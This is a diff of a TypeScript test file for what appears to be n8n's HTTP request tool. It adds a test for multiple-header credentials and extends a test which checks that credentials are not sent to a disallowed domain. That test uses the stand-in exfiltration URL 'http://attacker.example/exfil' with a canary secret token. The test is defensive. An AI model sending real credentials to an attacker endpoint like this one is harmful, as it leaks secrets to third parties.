@@ -1,4 +1,5 @@
 import type { INode, ISupplyDataFunctions, JsonObject } from 'n8n-workflow';
+import { HttpMultipleHeadersAuth } from 'n8n-nodes-base/dist/credentials/HttpMultipleHeadersAuth.credentials';
 import { NodeApiError, jsonParse } from 'n8n-workflow';
 import { mock } from 'vitest-mock-extended';
 
@@ -290,6 +291,66 @@ describe('ToolHttpRequest', () => {
 			);
 		});
 
+		it.each(['genericCredentialType', 'predefinedCredentialType'])(
+			'should send both Multiple Headers Auth headers with %s',
+			async (authentication) => {
+				const credentials = {
+					allowedHttpRequestDomains: 'domains',
+					allowedDomains: 'api.example.com',
+					headers: {
+						values: [
+							{ name: 'X-Service-Token', value: 'first-test-value' },
+							{ name: 'X-Account-Key', value: 'second-test-value' },
+						],
+					},
+				};
+				const credentialType = new HttpMultipleHeadersAuth();
+				helpers.httpRequestWithAuthentication.mockImplementation(async (type, requestOptions) => {
+					expect(type).toBe('httpMultipleHeadersAuth');
+					if (typeof credentialType.authenticate !== 'function') {
+						throw new Error('Expected a credential authenticator');
+					}
+					return await helpers.httpRequest(
+						await credentialType.authenticate(credentials, requestOptions),
+					);
+				});
+				helpers.httpRequest.mockResolvedValue({ body: 'Hello World' });
+				executeFunctions.getCredentials.mockResolvedValue(credentials);
+				executeFunctions.getNodeParameter.mockImplementation((paramName: string) => {
+					switch (paramName) {
+						case 'method':
+							return 'GET';
+						case 'url':
+							return 'https://api.example.com/data';
+						case 'authentication':
+							return authentication;
+						case 'genericAuthType':
+						case 'nodeCredentialType':
+							return 'httpMultipleHeadersAuth';
+						case 'options':
+							return {};
+						case 'placeholderDefinitions.values':
+							return [];
+						default:
+							return undefined;
+					}
+				});
+
+				const { response } = await httpTool.supplyData.call(executeFunctions, 0);
+
+				expect(await (response as N8nTool).invoke({})).toBe('Hello World');
+				expect(helpers.httpRequest).toHaveBeenCalledWith(
+					expect.objectContaining({
+						allowedDomains: 'api.example.com',
+						headers: {
+							'X-Service-Token': 'first-test-value',
+							'X-Account-Key': 'second-test-value',
+						},
+					}),
+				);
+			},
+		);
+
 		it('should apply Simplified Custom Auth through credential authentication', async () => {
 			helpers.httpRequestWithAuthentication.mockResolvedValue({
 				body: 'Hello World',
@@ -329,39 +390,44 @@ describe('ToolHttpRequest', () => {
 			);
 		});
 
-		it('should not send generic credentials to a domain the credential restricts', async () => {
-			executeFunctions.getNodeParameter.mockImplementation((paramName: string) => {
-				switch (paramName) {
-					case 'method':
-						return 'GET';
-					case 'url':
-						return 'http://attacker.example/exfil';
-					case 'authentication':
-						return 'genericCredentialType';
-					case 'genericAuthType':
-						return 'httpHeaderAuth';
-					case 'options':
-						return {};
-					case 'placeholderDefinitions.values':
-						return [];
-					default:
-						return undefined;
-				}
-			});
+		it.each(['httpHeaderAuth', 'httpMultipleHeadersAuth'])(
+			'should apply the domain restriction for %s',
+			async (genericAuthType) => {
+				executeFunctions.getNodeParameter.mockImplementation((paramName: string) => {
+					switch (paramName) {
+						case 'method':
+							return 'GET';
+						case 'url':
+							return 'http://attacker.example/exfil';
+						case 'authentication':
+							return 'genericCredentialType';
+						case 'genericAuthType':
+							return genericAuthType;
+						case 'options':
+							return {};
+						case 'placeholderDefinitions.values':
+							return [];
+						default:
+							return undefined;
+					}
+				});
 
-			executeFunctions.getCredentials.mockResolvedValue({
-				name: 'X-Secret-Token',
-				value: 'SECRET-TOOLHTTP-CANARY',
-				allowedHttpRequestDomains: 'domains',
-				allowedDomains: 'api.example.com',
-			});
+				executeFunctions.getCredentials.mockResolvedValue({
+					name: 'X-Secret-Token',
+					value: 'SECRET-TOOLHTTP-CANARY',
+					headers: { values: [{ name: 'X-Secret-Token', value: 'SECRET-TOOLHTTP-CANARY' }] },
+					allowedHttpRequestDomains: 'domains',
+					allowedDomains: 'api.example.com',
+				});
 
-			const { response } = await httpTool.supplyData.call(executeFunctions, 0);
-			const res = await (response as N8nTool).invoke({});
+				const { response } = await httpTool.supplyData.call(executeFunctions, 0);
+				const res = await (response as N8nTool).invoke({});
 
-			expect(helpers.httpRequest).not.toHaveBeenCalled();
-			expect(res).toContain('Domain not allowed');
-		});
+				expect(helpers.httpRequest).not.toHaveBeenCalled();
+				expect(helpers.httpRequestWithAuthentication).not.toHaveBeenCalled();
+				expect(res).toContain('Domain not allowed');
+			},
+		);
 
 		it('should send generic credentials to a domain the credential allows', async () => {
 			helpers.httpRequest.mockResolvedValue({
